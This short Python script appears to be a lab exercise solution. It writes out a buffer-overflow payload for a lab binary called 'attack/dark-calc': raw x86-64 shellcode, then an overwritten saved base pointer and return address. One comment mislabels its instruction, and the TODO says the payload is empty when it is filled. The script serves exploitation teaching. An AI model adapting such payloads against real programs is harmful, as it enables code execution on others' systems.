#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

# mov rdi,0x4
payload = b"\xbf\x04\x00\x00\x00"

# mov rax,[addr]
payload = payload + b"\x48\xc7\xc0\x87\x1a\x40\x00"

# call rax
payload = payload + b"\xff\xd0"

# leave & ret
payload = payload + b"\xc9\xc3"

# keep rbp
payload = payload + b"\xf0\x0f\x80\x00\x10\x72\x00\x00"

# addr to stack
payload = payload + b"\xd0\x0f\x80\x00\x10\x72\x00\x00"

sys.stdout.buffer.write(payload)
